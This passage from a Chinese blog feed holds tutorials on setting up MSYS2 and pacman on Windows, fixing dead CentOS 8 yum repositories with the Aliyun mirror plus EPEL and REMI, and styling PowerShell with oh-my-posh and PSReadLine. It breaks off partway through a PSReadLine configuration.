        <content type="html"><![CDATA[<h1 id="MSYS2教程"><a href="#MSYS2教程" class="headerlink" title="MSYS2教程"></a>MSYS2教程</h1><hr><h3 id="一、安装-MSYS2"><a href="#一、安装-MSYS2" class="headerlink" title="一、安装 MSYS2"></a><strong>一、安装 MSYS2</strong></h3><ol><li><p><strong>下载 MSYS2 安装程序</strong></p><ul><li>访问 MSYS2 官方网站：<a href="https://www.msys2.org/">MSYS2 官网</a>。</li><li>下载适合你的系统的 MSYS2 安装程序（通常是 64 位版本）。</li></ul></li><li><p><strong>安装 MSYS2</strong></p><ul><li>运行下载的安装程序。</li><li>按照提示完成安装，建议将 MSYS2 安装到 <code>C:\msys64</code> 等不包含空格或特殊字符的路径。</li><li>安装完成后，点击 <strong>Finish</strong>。</li></ul></li><li><p><strong>初始化 MSYS2 环境</strong></p><ul><li><p>安装完成后运行 <code>C:\msys64\msys2.exe</code> 启动 MSYS2 环境。</p></li><li><p>更新核心库：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacman <span class="token parameter variable">-Syu</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>如果提示需要关闭终端，关闭后重新打开 MSYS2 终端并继续更新：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacman <span class="token parameter variable">-Su</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul></li></ul></li></ol><hr><h3 id="二、将-MSYS2-添加到终端"><a href="#二、将-MSYS2-添加到终端" class="headerlink" title="二、将 MSYS2 添加到终端"></a><strong>二、将 MSYS2 添加到终端</strong></h3><ol><li><p><strong>为 Windows Terminal 添加配置</strong></p><p>运行 Windows Terminal 后，按照下面步骤新增 Msys2 shell</p><ul><li>点击标题栏右边的向下指示符，选择 <code>Settings</code></li><li>左边侧栏，下边，点击 <code>Add a new profile</code></li><li>选择一个已经存在的 shell，点击 <code>Duplicate</code>，即基于原存 shell 创建新 shell</li><li>主要设置项<ul><li>Name: 如 <code>MSYS / MSYS2</code></li><li>Command line: <code>C:/msys64/msys2_shell.cmd -defterm -here -no-start -use-full-path -msys</code></li><li>Starting directory: <code>C:/msys64/home/%USERNAME%</code></li><li>Icon: <code>C:/msys64/msys2.ico</code></li></ul></li><li>点击 <code>Save</code> 保存</li><li>要添加minge64，直接修改最后-msys为-ming64，其他同理</li></ul></li><li><p><strong>为 VS Code 配置终端</strong></p><ul><li><p>打开 VS Code，按 <code>Ctrl + Shift + P</code> 打开命令面板，选择 “Preferences: Open Settings (JSON)”。</p></li><li><p>添加以下内容：</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token property">"terminal.integrated.profiles.windows"</span><span class="token operator">:</span> <span class="token punctuation">{</span>  <span class="token property">"MSYS2"</span><span class="token operator">:</span> <span class="token punctuation">{</span>    <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"C:/msys64/msys2_shell.cmd"</span><span class="token punctuation">,</span>    <span class="token property">"args"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"-defterm, -here, -no-start, -use-full-path, -msys"</span><span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token property">"terminal.integrated.defaultProfile.windows"</span><span class="token operator">:</span> <span class="token string">"MSYS2"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul></li><li><p><strong>全局访问 MSYS2</strong></p><ul><li>如果希望从 CMD、PowerShell 等终端中也能使用 MSYS2 工具，确保 <code>C:\msys64\usr\bin</code>被添加到系统环境变量 Path中：<ul><li>右键 <strong>此电脑</strong> &gt; <strong>属性</strong> &gt; <strong>高级系统设置</strong> &gt; <strong>环境变量</strong>。</li><li>在“系统变量”中找到 Path，点击“编辑”，添加：<code>C:\msys64\usr\bin</code></li></ul></li><li>保存后，重启终端即可在任意终端中访问 MSYS2 工具。</li></ul></li></ol><hr><h3 id="三、MSYS2-基础操作"><a href="#三、MSYS2-基础操作" class="headerlink" title="三、MSYS2 基础操作"></a><strong>三、MSYS2 基础操作</strong></h3><p>MSYS2 提供三个核心环境：</p><ul><li><strong>MSYS</strong>：适用于开发 Windows 工具。</li><li><strong>MINGW32</strong>：用于 32 位 Windows 应用程序开发。</li><li><strong>MINGW64</strong>：用于 64 位 Windows 应用程序开发。</li></ul><h4 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a><strong>常见命令</strong></h4><ol><li><p><strong>切换到 MSYS 环境</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msys2_shell.cmd <span class="token parameter variable">-msys</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>切换到 64 位 MINGW 环境</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msys2_shell.cmd <span class="token parameter variable">-mingw64</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p><strong>切换到 32 位 MINGW 环境</strong>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msys2_shell.cmd <span class="token parameter variable">-mingw32</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><hr><h3 id="四、MSYS2-包管理"><a href="#四、MSYS2-包管理" class="headerlink" title="四、MSYS2 包管理"></a><strong>四、MSYS2 包管理</strong></h3><p>MSYS2 使用 <code>pacman</code> 包管理器来管理软件包。常用命令如下：</p><h4 id="1-更新系统"><a href="#1-更新系统" class="headerlink" title="1. 更新系统"></a><strong>1. 更新系统</strong></h4><p>更新软件包数据库并升级所有包：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacman <span class="token parameter variable">-Syu</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="2-搜索包"><a href="#2-搜索包" class="headerlink" title="2. 搜索包"></a><strong>2. 搜索包</strong></h4><p>搜索某个软件包：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacman <span class="token parameter variable">-Ss</span> <span class="token operator">&lt;</span>包名<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例如，搜索 <code>gcc</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacman <span class="token parameter variable">-Ss</span> gcc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="3-安装包"><a href="#3-安装包" class="headerlink" title="3. 安装包"></a><strong>3. 安装包</strong></h4><p>安装某个软件包：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacman <span class="token parameter variable">-S</span> <span class="token operator">&lt;</span>包名<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例如，安装 <code>gcc</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacman <span class="token parameter variable">-S</span> mingw-w64-x86_64-gcc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="4-卸载包"><a href="#4-卸载包" class="headerlink" title="4. 卸载包"></a><strong>4. 卸载包</strong></h4><p>卸载某个软件包：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacman <span class="token parameter variable">-R</span> <span class="token operator">&lt;</span>包名<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例如，卸载 <code>gcc</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacman <span class="token parameter variable">-R</span> mingw-w64-x86_64-gcc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="5-查看已安装包"><a href="#5-查看已安装包" class="headerlink" title="5. 查看已安装包"></a><strong>5. 查看已安装包</strong></h4><p>查看已安装的软件包：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacman <span class="token parameter variable">-Q</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="6-清理缓存"><a href="#6-清理缓存" class="headerlink" title="6. 清理缓存"></a><strong>6. 清理缓存</strong></h4><p>清理过时的缓存：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacman <span class="token parameter variable">-Sc</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="7-升级或者降级本地文件安装的包"><a href="#7-升级或者降级本地文件安装的包" class="headerlink" title="7. 升级或者降级本地文件安装的包"></a>7. <strong>升级或者降级本地文件安装的包</strong></h4><p>如果存储库中没有合适的旧版本，您可以通过以下方式获取旧版本：</p><ol><li>访问 MSYS2 包存储库<a href="https://repo.msys2.org/%E3%80%82">https://repo.msys2.org/。</a></li><li>搜索 <code>openssl</code>。</li><li>找到适合的版本（例如 1.1.x）。</li><li>下载 <code>.pkg.tar.zst</code> 文件。</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacman <span class="token parameter variable">-U</span> <span class="token operator">&lt;</span>文件路径<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>从本地文件安装或升级软件包。<br>例如：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacman <span class="token parameter variable">-U</span> /path/to/package.pkg.tar.zst<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>找不到版本，可以去官方网站找，下载压缩包，解压进入目录执行(使用mingw64环境)</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./config <span class="token parameter variable">--prefix</span><span class="token operator">=</span>/mingw64<span class="token function">make</span><span class="token function">make</span> <span class="token function">install</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="8-查看依赖链"><a href="#8-查看依赖链" class="headerlink" title="8. 查看依赖链"></a>8. <strong>查看依赖链</strong></h4><p>查看哪些软件包依赖于 <code>mingw-w64-x86_64-openssl</code>：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pactree <span class="token parameter variable">-r</span> mingw-w64-x86_64-openssl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="9-强制卸载"><a href="#9-强制卸载" class="headerlink" title="9. 强制卸载"></a>9. <strong>强制卸载</strong></h4><p>您可以强制删除 <code>mingw-w64-x86_64-openssl</code> 及其依赖软件，但请注意，这可能会导致其他软件无法正常工作。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacman <span class="token parameter variable">-Rdd</span> mingw-w64-x86_64-openssl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="10-卸载相关依赖"><a href="#10-卸载相关依赖" class="headerlink" title="10. 卸载相关依赖"></a>10. <strong>卸载相关依赖</strong></h4><p>卸载所有依赖软件（如 <code>mingw-w64-x86_64-python</code>）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacman <span class="token parameter variable">-Rns</span> mingw-w64-x86_64-python<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="五、安装开发工具示例"><a href="#五、安装开发工具示例" class="headerlink" title="五、安装开发工具示例"></a><strong>五、安装开发工具示例</strong></h3><h4 id="安装-GCC-编译器"><a href="#安装-GCC-编译器" class="headerlink" title="安装 GCC 编译器"></a><strong>安装 GCC 编译器</strong></h4><ol><li><p>安装 GCC：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacman <span class="token parameter variable">-S</span> mingw-w64-x86_64-gcc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>验证安装：</p><pre class="line-numbers language-none"><code class="language-none">gcc --version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><p>如果你希望在 CMD 或 PowerShell 中直接使用 GCC：</p><ol><li><p>打开系统的环境变量设置。</p></li><li><p>将以下路径添加到用户或系统的 Path中：<code>C:\msys64\mingw64\bin</code></p></li><li><p>保存后，打开 CMD 或 PowerShell，运行：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token parameter variable">--version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h4 id="安装-Python"><a href="#安装-Python" class="headerlink" title="安装 Python"></a><strong>安装 Python</strong></h4><ol><li><p>安装 Python：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacman <span class="token parameter variable">-S</span> mingw-w64-x86_64-python<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>验证安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python <span class="token parameter variable">--version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h4 id="安装-Node-js"><a href="#安装-Node-js" class="headerlink" title="安装 Node.js"></a><strong>安装 Node.js</strong></h4><ol><li><p>安装 Node.js：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pacman <span class="token parameter variable">-S</span> mingw-w64-x86_64-nodejs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>验证安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">node</span> <span class="token parameter variable">--version</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
            <tag> 环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>centos8官方源失效</title>
      <link href="/2024/07/03/centos8-guan-fang-yuan-shi-xiao/"/>
      <url>/2024/07/03/centos8-guan-fang-yuan-shi-xiao/</url>
      
        <content type="html"><![CDATA[<h1 id="centos8官方源失效"><a href="#centos8官方源失效" class="headerlink" title="centos8官方源失效"></a>centos8官方源失效</h1><p>当你运行yum的下载命令时有如下报错</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">CentOS Stream <span class="token number">8</span> - AppStream                                                                           Errors during downloading metadata <span class="token keyword">for</span> repository <span class="token string">'appstream'</span><span class="token builtin class-name">:</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这表明官方源已经失效，只能更换源，这里更换国内的阿里镜像源，当然在这之前你可以试试ping各类网站，试试是不是自己网络问题</p><h2 id="更换源"><a href="#更换源" class="headerlink" title="更换源"></a>更换源</h2><h3 id="重置-yum配置"><a href="#重置-yum配置" class="headerlink" title="重置 yum配置"></a>重置 yum配置</h3><p>如果之前进行了许多更改，可能需要重置yum配置以确保没有配置错误。</p><h4 id="备份并重新创建-yum-配置文件"><a href="#备份并重新创建-yum-配置文件" class="headerlink" title="备份并重新创建 yum 配置文件"></a>备份并重新创建 yum 配置文件</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mv</span> /etc/yum.repos.d /etc/yum.repos.d.bak<span class="token function">sudo</span> <span class="token function">mkdir</span> /etc/yum.repos.d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="下载阿里源"><a href="#下载阿里源" class="headerlink" title="下载阿里源"></a>下载阿里源</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">wget</span> <span class="token parameter variable">-O</span> /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-vault-8.5.2111.repo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>若是本地网络，下载再上传</p><h4 id="清理-yum-缓存并重建缓存"><a href="#清理-yum-缓存并重建缓存" class="headerlink" title="清理 yum 缓存并重建缓存"></a>清理 yum 缓存并重建缓存</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum clean all<span class="token function">sudo</span> yum makecache<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="添加一个非官方源（国外）"><a href="#添加一个非官方源（国外）" class="headerlink" title="添加一个非官方源（国外）"></a>添加一个非官方源（国外）</h2><h3 id="在-CentOS-8-x-上安装-EPEL-存储库"><a href="#在-CentOS-8-x-上安装-EPEL-存储库" class="headerlink" title="在 CentOS 8.x 上安装 EPEL 存储库"></a>在 CentOS 8.x 上安装 EPEL 存储库</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token parameter variable">-i</span>  <span class="token comment">#切换到root</span>yum search epel  <span class="token comment">#搜索</span>yum <span class="token function">install</span> epel-release <span class="token comment"># 安装</span>yum config-manager --set-enabled epel <span class="token comment">#启用 EPEL 存储库</span>yum config-manager --set-enabled PowerTools yum update <span class="token comment">#更新源</span>yum repolist <span class="token comment">#查看已安装的库</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="使用-EPEL-存储库"><a href="#使用-EPEL-存储库" class="headerlink" title="使用 EPEL 存储库"></a>使用 EPEL 存储库</h3><pre class="line-numbers language-none"><code class="language-none">sudo yum --disablerepo="*" --enablerepo="epel" list available | grep 'package'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>**<code>yum</code>**： 这是 CentOS 和 RHEL 系统上用于管理软件包的命令行工具</p><p>**<code>--disablerepo="\*"</code>**： 这个选项禁用所有配置的存储库，<code>*</code> 是一个通配符，表示所有存储库都将被禁用</p><p>**<code>--enablerepo="epel"</code>**： 这个选项仅启用 EPEL 存储库，这样可以确保命令只查询并显示 EPEL 存储库中的软件包</p><p>**<code>list available</code>**： 这个子命令列出所有可用的软件包，它会显示在启用的存储库中可供安装的软件包列表</p><p>**<code>grep 'package'</code>**：匹配包名</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token parameter variable">--enablerepo</span><span class="token operator">=</span><span class="token string">"epel"</span> <span class="token function">install</span> <span class="token operator">&lt;</span>package<span class="token operator">&gt;</span> <span class="token comment"># 从 EPEL 存储库安装软件包</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="安装并启用-REMI-存储库"><a href="#安装并启用-REMI-存储库" class="headerlink" title="安装并启用 REMI 存储库"></a>安装并启用 REMI 存储库</h2><p>在终端中执行以下命令，在 CentOS 8上安装 REMI 存储库</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token parameter variable">-y</span> <span class="token function">install</span> https://rpms.remirepo.net/enterprise/remi-release-8.rpm<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>检查已启用的存储库</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum repolist<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>您可以安装 yum-config-manager，这将帮助您从命令行快速启用和禁用存储库，前面config-manager报错就可以安装</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token parameter variable">-y</span> <span class="token function">install</span> dnf-utils<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>运行时启用存储库</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> yum <span class="token parameter variable">--enablerepo</span><span class="token operator">=</span>remi <span class="token function">install</span> <span class="token operator">&lt;</span>package<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://help.aliyun.com/zh/ecs/user-guide/change-centos-8-repository-addresses">CentOS 8 EOL如何切换源？_云服务器 ECS(ECS)-阿里云帮助中心 (aliyun.com)</a></p><p><a href="https://www.cyberciti.biz/faq/how-to-enable-and-install-epel-repo-on-centos-8-x/">如何在 CentOS 8 上启用和安装 EPEL Repo - nixCraft (cyberciti.biz)</a></p><p><a href="https://computingforgeeks.com/how-to-install-epel-repository-on-rhel-8-centos-8/">如何在 RHEL 8 或 CentOS 8 上安装 EPEL 存储库 |ComputingForGeeks的</a></p><p><a href="https://computingforgeeks.com/install-and-enable-remi-repository-on-centos-rhel/">在 CentOS 8 上安装并启用 REMI 存储库 |RHEL 8 |ComputingForGeeks的</a></p>]]></content>
      
      
      <categories>
          
          <category> bug </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>powershell美化</title>
      <link href="/2024/06/27/powershell-mei-hua/"/>
      <url>/2024/06/27/powershell-mei-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="powershell美化"><a href="#powershell美化" class="headerlink" title="powershell美化"></a>powershell美化</h1><h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>除了安装命令，其他都是测试命令，后续再写进配置文件</p><h2 id="安装主题控件"><a href="#安装主题控件" class="headerlink" title="安装主题控件"></a>安装主题控件</h2><p>安装主题oh-my-posh，powershell中执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">winget <span class="token function">install</span> JanDeDobbeleer.OhMyPosh <span class="token parameter variable">-s</span> wingetoh-my-posh init pwsh <span class="token operator">|</span> Invoke-Expression <span class="token comment"># 查看效果，这里可能不能显示符号</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>点击加号旁边进入设置，左边点击powershell，向下滑点击外观，将字体改成nerd类型的字体，也能到<a href="https://www.nerdfonts.com/font-downloads">Nerd Fonts - Iconic font aggregator, glyphs/icons collection, &amp; fonts patcher</a>下载字体</p><p>也能直接改默认</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Get-PoshThemes <span class="token comment"># 查看主题</span><span class="token comment"># 选择并应用一个主题</span>oh-my-posh init pwsh <span class="token parameter variable">--config</span> <span class="token string">"<span class="token variable">$env</span>:POSH_THEMES_PATH<span class="token entity" title="\t">\t</span>heme.json"</span> <span class="token operator">|</span> Invoke-Expression<span class="token comment"># 将 $env:POSH_THEMES_PATH\theme.json 替换为实际的主题文件路径,运行$env:POSH_THEMES_PATH可以看到主题的绝对路径</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="powershell模块管理基础命令"><a href="#powershell模块管理基础命令" class="headerlink" title="powershell模块管理基础命令"></a>powershell模块管理基础命令</h2><h3 id="1-安装模块"><a href="#1-安装模块" class="headerlink" title="1. 安装模块"></a>1. 安装模块</h3><p>使用 <code>Install-Module</code> 命令从 PowerShell Gallery 安装模块：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Install-Module</span> <span class="token operator">-</span>Name ModuleName <span class="token operator">-</span>Force<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-导入模块"><a href="#2-导入模块" class="headerlink" title="2. 导入模块"></a>2. 导入模块</h3><p>使用 <code>Import-Module</code> 命令加载模块，使其命令可用：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Import-Module</span> <span class="token operator">-</span>Name ModuleName<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="3-查看已安装模块"><a href="#3-查看已安装模块" class="headerlink" title="3. 查看已安装模块"></a>3. 查看已安装模块</h3><p>使用 <code>Get-Module</code> 查看当前会话中已加载的模块，或者使用 <code>-ListAvailable</code> 参数查看系统上所有已安装的模块：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># 查看当前会话中已加载的模块</span><span class="token function">Get-Module</span><span class="token comment"># 查看系统上所有已安装的模块</span><span class="token function">Get-Module</span> <span class="token operator">-</span>ListAvailable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-获取模块命令"><a href="#4-获取模块命令" class="headerlink" title="4. 获取模块命令"></a>4. 获取模块命令</h3><p>使用 <code>Get-Command</code> 查看某个模块中的所有命令：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Get-Command</span> <span class="token operator">-</span>Module ModuleName<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="5-查看模块信息"><a href="#5-查看模块信息" class="headerlink" title="5. 查看模块信息"></a>5. 查看模块信息</h3><p>使用 <code>Get-Module</code> 查看模块的详细信息：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Get-Module</span> <span class="token operator">-</span>Name ModuleName<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="6-更新模块"><a href="#6-更新模块" class="headerlink" title="6. 更新模块"></a>6. 更新模块</h3><p>使用 <code>Update-Module</code> 更新已安装的模块：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Update-Module</span> <span class="token operator">-</span>Name ModuleName<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="7-卸载模块"><a href="#7-卸载模块" class="headerlink" title="7. 卸载模块"></a>7. 卸载模块</h3><p>使用 <code>Remove-Module</code> 卸载模块，从当前会话中移除：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Remove-Module</span> <span class="token operator">-</span>Name ModuleName<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="8-查找模块"><a href="#8-查找模块" class="headerlink" title="8. 查找模块"></a>8. 查找模块</h3><p>使用 <code>Find-Module</code> 从 PowerShell Gallery 查找模块：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Find-Module</span> <span class="token operator">-</span>Name ModuleName<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="9-保存模块"><a href="#9-保存模块" class="headerlink" title="9. 保存模块"></a>9. 保存模块</h3><p>使用 <code>Save-Module</code> 将模块保存到本地文件夹，而不是直接安装：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Save-Module</span> <span class="token operator">-</span>Name ModuleName <span class="token operator">-</span>Path C:\Path\To\Save<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="10-发布模块"><a href="#10-发布模块" class="headerlink" title="10. 发布模块"></a>10. 发布模块</h3><p>使用 <code>Publish-Module</code> 将模块发布到 PowerShell Gallery（需要先进行配置和认证）：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Publish-Module</span> <span class="token operator">-</span>Name ModuleName <span class="token operator">-</span>NuGetApiKey <span class="token string">'YourApiKey'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="示例：安装和使用-PSReadLine-模块"><a href="#示例：安装和使用-PSReadLine-模块" class="headerlink" title="示例：安装和使用 PSReadLine 模块"></a>示例：安装和使用 <code>PSReadLine</code> 模块</h3><p>下面是一个完整的示例，展示了如何安装、导入和使用 <code>PSReadLine</code> 模块：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment"># 安装 PSReadLine 模块</span><span class="token function">Install-Module</span> <span class="token operator">-</span>Name PSReadLine <span class="token operator">-</span>Force<span class="token comment"># 导入 PSReadLine 模块</span><span class="token function">Import-Module</span> <span class="token operator">-</span>Name PSReadLine<span class="token comment"># 查看 PSReadLine 模块中的命令</span><span class="token function">Get-Command</span> <span class="token operator">-</span>Module PSReadLine<span class="token comment"># 设置 PSReadLine 选项（例如，设置语法高亮颜色）</span><span class="token function">Set-PSReadLineOption</span> <span class="token operator">-</span>PredictionSource History<span class="token comment"># 卸载 PSReadLine 模块（从当前会话中移除）</span><span class="token function">Remove-Module</span> <span class="token operator">-</span>Name PSReadLine<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="安装插件（可选）"><a href="#安装插件（可选）" class="headerlink" title="安装插件（可选）"></a>安装插件（可选）</h2><p>首先设置PSGallery为受信任存储库</p><p>要将<code>PSGallery</code>设置为受信任的存储库，可以运行以下命令：</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Set-PSRepository</span> <span class="token operator">-</span>Name <span class="token string">'PSGallery'</span> <span class="token operator">-</span>InstallationPolicy Truste<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="PSReadLine"><a href="#PSReadLine" class="headerlink" title="PSReadLine"></a>PSReadLine</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Install-Module <span class="token parameter variable">-Name</span> PSReadLine <span class="token parameter variable">-Scope</span> CurrentUser <span class="token parameter variable">-Force</span> <span class="token parameter variable">-SkipPublisherCheck</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我的配置附上</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Import-Module</span> PSReadLine<span class="token comment"># 设置 PSReadLine 的编辑模式为 Emacs 风格</span><span class="token comment"># 禁用提示音</span><span class="token comment"># 设置历史预测源为命令历史</span><span class="token comment"># 设置预测视图样式为列表视图</span><span class="token comment"># 启用工具提示功能</span><span class="token comment"># 防止保存历史记录中的重复命令</span><span class="token function">Set-PSReadLineOption</span> <span class="token operator">-</span>EditMode Emacs `                     <span class="token operator">-</span>BellStyle None `                     <span class="token operator">-</span>PredictionSource History `                     <span class="token operator">-</span>PredictionViewStyle ListView `                     <span class="token operator">-</span>ShowToolTips `                     <span class="token operator">-</span>HistoryNoDuplicates `                     <span class="token operator">-</span>Colors @<span class="token punctuation">{</span> <span class="token comment"># 设置不同元素的颜色，如命令、参数、运算符、变量、字符串、数字、成员、类型、和默认颜色</span>                         Command = <span class="token string">'Cyan'</span>                         Parameter = <span class="token string">'Yellow'</span>                         Operator = <span class="token string">'Red'</span>                         Variable = <span class="token string">'Green'</span>                         String = <span class="token string">'Magenta'</span>                         